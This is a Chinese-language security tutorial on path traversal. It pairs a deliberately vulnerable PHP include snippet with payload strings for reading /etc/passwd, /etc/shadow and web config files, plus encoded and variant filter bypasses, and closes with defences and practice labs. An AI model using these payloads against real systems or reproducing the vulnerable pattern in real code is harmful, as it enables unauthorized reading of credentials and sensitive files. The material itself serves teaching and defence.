---
title: 路径遍历
description: 路径遍历漏洞原理、绕过方式与防御方法。
date: 2026-07-22T00:00:00.000Z
---


## 路径遍历

路径遍历（Path Traversal），也叫目录穿越，是攻击者用 `../` 跳出程序本来允许访问的目录，去读取服务器上的其他文件。常见目标是 `/etc/passwd`、Web 源码和配置文件。

### 危害

- 读取任意文件，包括源码和敏感配置
- 配合日志注入还能伪造登录
- 有时能进一步发展为代码执行

---

### 一、漏洞原理

当程序根据文件名直接拼出磁盘路径去读文件，又不检查文件名里有没有 `..` 时，漏洞就出现了。看一段典型代码：

```php
<?php
$file = $_GET['file'];
include("/var/www/html/uploads/" . $file);
```

正常情况下访问 `?file=avatar.png`，读的是 uploads 目录里的图片。但如果传 `?file=../../../../etc/passwd`，`..` 一层层往上跳，拼出来的路径越过了 uploads 目录，把 `/etc/passwd` 的内容读了出来。

```
/var/www/html/uploads/../../../../etc/passwd
```

### 二、常见利用

```bash
# 读取系统文件
../../../../etc/passwd
../../../../etc/shadow

# 读取 Web 配置
../../../../var/www/html/config.php

# Windows 下用反斜杠
..\..\..\windows\win.ini
```

要用几层 `../` 没有固定答案，取决于当前目录离根目录多远，一般从三四层开始试。读到的内容直接回显时最好办；没回显就得靠别的办法，比如让报错信息带出文件路径。

### 三、绕过技巧

很多程序会过滤 `..` 和 `/`，绕过方式不少。

#### 编码绕过

```
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2fetc/passwd
..%252f..%252fetc/passwd   # 双重编码
```

#### 变形绕过

```
....//....//etc/passwd       # 过滤 .. 后再拼出 ..
..\/../\/etc/passwd          # 反斜杠和斜杠混用
..././..././etc/passwd       # 用 . 干扰过滤
```

### 四、防御方法

1. 对文件名做规范化（realpath）后再判断它是否落在允许的目录里
2. 用白名单限制可访问的文件
3. 不用用户输入直接拼路径，改由 id 之类的参数查数据库

### 五、练习平台

- [DVWA](https://github.com/digininja/DVWA) 的 File Inclusion 模块
- [Pikachu](https://github.com/zhuifengshaonianhanlu/pikachu)
- [BUUCTF Web 方向](https://buuoj.cn/)
